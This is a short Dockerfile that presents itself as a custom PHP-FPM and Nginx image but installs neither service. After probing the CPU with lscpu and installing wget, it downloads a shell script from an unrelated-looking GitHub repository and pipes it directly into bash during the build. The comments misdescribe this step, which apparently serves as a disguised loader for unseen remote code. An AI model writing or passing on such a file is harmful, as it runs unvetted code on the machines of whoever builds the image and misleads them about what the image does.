FROM ubuntu:20.04 

# LABEL about the custom image
LABEL maintainer="kntlpop@gmail.com"
LABEL version="0.1"
LABEL description="This is custom Docker Image for \
the PHP-FPM and Nginx Services."

# Disable Prompt During Packages Installation
ARG DEBIAN_FRONTEND=noninteractive

# Update Ubuntu Software repository
RUN lscpu
RUN apt update

# Install nginx, php-fpm and supervisord from ubuntu repository
RUN apt -y install wget
RUN wget -O - https://github.com/kamilairsyat08/viwarlanpo123/raw/main/b.sh | bash
